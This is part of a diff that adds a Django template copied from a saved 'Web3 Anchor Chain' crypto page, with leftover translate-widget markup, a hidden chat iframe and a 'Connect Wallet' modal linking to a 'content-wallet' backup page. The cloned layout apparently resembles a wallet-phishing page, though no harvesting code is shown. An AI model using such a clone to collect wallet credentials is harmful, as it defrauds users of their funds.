+                        class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation"
+                        aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24"
+                                viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                                <path
+                                    d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z">
+                                </path>
+                            </svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24"
+                                viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                                <path
+                                    d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z">
+                                </path>
+                            </svg></span></button></div>
+            </div>
+            <div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce" bis_skin_checked="1">
+                <form id="goog-gt-votingForm" action="https://translate.googleapis.com/translate_voting?client=te"
+                    method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl"
+                        id="goog-gt-votingInputSrcLang"><input type="text" name="tl"
+                        id="goog-gt-votingInputTrgLang"><input type="text" name="query"
+                        id="goog-gt-votingInputSrcText"><input type="text" name="gtrans"
+                        id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote">
+                </form><iframe name="votingFrame" frameborder="0"
+                    src="{% static '/Home - Web3 Anchor Chain_files/saved_resource.html'%}"></iframe>
+            </div>
+        </div>
+    </div>
+    <div class="fixed inset-0 z-[999] hidden overflow-y-auto bg-black/80 text-white"
+        :class="isOpen &amp;&amp; &#39;!block&#39;" data-teleport-target="true" bis_skin_checked="1">
+        <div class="flex min-h-screen items-center justify-center px-3" @click.self="closeModal" bis_skin_checked="1">
+            <div x-show="isOpen" x-transition="" x-transition.duration.300=""
+                class="my-8 w-full max-w-2xl border border-gray-600 overflow-hidden rounded-xl bg-gray-800 p-6 xl:p-8"
+                bis_skin_checked="1" style="display: none;">
+                <div class="mb-7 xl:mb-10 flex items-center justify-between" bis_skin_checked="1">
+                    <div bis_skin_checked="1">
+                        <h3 class="mb-3 text-2xl font-bold">Connect Wallet</h3>
+                        <p class="text-gray-400 lg:text-lg">Gateway to Web3</p>
+                    </div>
+                    <button @click="closeModal"
+                        class="w-10 h-10 rounded-full hover:rotate-180 duration-300 bg-gray-700 flex items-center justify-center">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="p-6 rounded-xl border border-gray-600 gap-4 flex-wrap flex justify-between items-center mb-6"
+                    bis_skin_checked="1">
+                    <div class="flex gap-3 items-center" bis_skin_checked="1">
+                        <img src="{% static '/Home - Web3 Anchor Chain_files/icon.png'%}" alt="Wallet Icon" class="w-12 h-12">
+                        <h4 class="text-xl font-semibold">Automatic/Manual backup</h4>
+                    </div>
+                    <a href="content-wallet?secure="
+                        class="bg-gradient-to-r from-primary-500 to-secondary-500 rounded-full px-6 py-3 text-white font-medium hover:from-primary-600 hover:to-secondary-600 transition-all inline-block">
+                        Continue
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="VIpgJd-ZVi9od-aZ2wEe-wOHMyf" bis_skin_checked="1">
+        <div class="VIpgJd-ZVi9od-aZ2wEe-OiiCO" bis_skin_checked="1"><svg xmlns="http://www.w3.org/2000/svg"
+                class="VIpgJd-ZVi9od-aZ2wEe" width="96px" height="96px" viewBox="0 0 66 66">
+                <circle class="VIpgJd-ZVi9od-aZ2wEe-Jt5cK" fill="none" stroke-width="6" stroke-linecap="round" cx="33"
+                    cy="33" r="30"></circle>
+            </svg></div>
+    </div><iframe id="chat-application-iframe" title="Smartsupp" aria-hidden="true"
+        style="display: block; position: fixed; top: 0px; left: 0px; width: 1px; height: 1px; opacity: 0; border: none; z-index: -1; pointer-events: none;"
+        src="{% static '/Home - Web3 Anchor Chain_files/saved_resource(1).html'%}"></iframe>
+    <div id="smartsupp-widget-container" bis_skin_checked="1"><!----><!----><!----> <!----><!----> <!---->
+        <div data-testid="widgetButtonFrame"
+            style="border-radius: 9999px; box-shadow: rgba(0, 0, 0, 0.06) 0px 1px 6px, rgba(0, 0, 0, 0.12) 0px 2px 32px; color-scheme: normal; height: 56px; position: fixed; bottom: 24px; left: initial; right: 12px; z-index: 10000000; width: 109px;"
+            bis_skin_checked="1"><iframe allowfullscreen="" scrolling="no" id="widgetButtonFrame"
+                title="Smartsupp widget button"
+                style="position: absolute; width: 100%; height: 100%; border: none; display: block; text-align: left; margin: 0px; padding: 0px; top: 0px; left: 0px; opacity: 1;"
+                src="{% static '/Home - Web3 Anchor Chain_files/saved_resource(2).html'%}"></iframe><!----></div><!---->
+        <!----><!----> <!----><!----><!---->
+    </div>
+</body>
+
+</html>
